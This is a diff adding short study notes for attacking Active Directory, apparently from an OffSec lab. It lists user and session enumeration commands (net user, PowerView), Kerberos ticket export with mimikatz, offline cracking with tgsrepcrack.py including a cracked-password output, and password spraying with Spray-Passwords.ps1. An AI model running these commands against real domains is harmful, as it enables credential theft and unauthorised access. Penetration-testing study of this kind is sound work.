@@ -1,0 +1,38 @@
+User Enum:-
+						Traditional Approach
+net user # Usernames enum within the system
+net user /domain # Enum all users within the entire domain
+	net user user_name /domain # will list the information about the user within the domain
+
+						Modern Approach
+Get-ADUser ##Script
+PS C:\Users\offsec.CORP> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrent Domain() #it retrieves the Domain object for the currently logged in user
+
+LDAP://HostName[:PortNumber][/DistinguishedName]  #example:- LDAP://DC01.corp.com/DC=corp,DC=com
+
+
+Powerview:- (Get-NetSession,Get-NetLoggedon) #Enum from the current login user
+PS C:\Tools\active_directory> Get-NetLoggedon -ComputerName client251
+Get-NetSession -ComputerName dc01
+
+nslookup CorpWebServer.corp.com
+
+
+Kerberos Ticket Crack Process:-
+
+klist #command to display all cached Kerberos tickets for the current user
+mimikatz # kerberos::list /export #To domnload the tickets for futhure Process
+use tgsrepcrack.py for bruteforce the tickets
+Example:-
+	sudo apt update && sudo apt install kerberoast
+	python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
+	found password for ticket 0: Qwerty09! File: 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
+	All tickets cracked!
+Spray-Passwords.ps1 -Pass Qwerty09! -Admin #this example contain one password u can do with wordlist as well and -Admin tab means it also check or includes the admin account as well ..This attack is slow and steady but sometimes took ages 
+
+
+
+
+
+
+
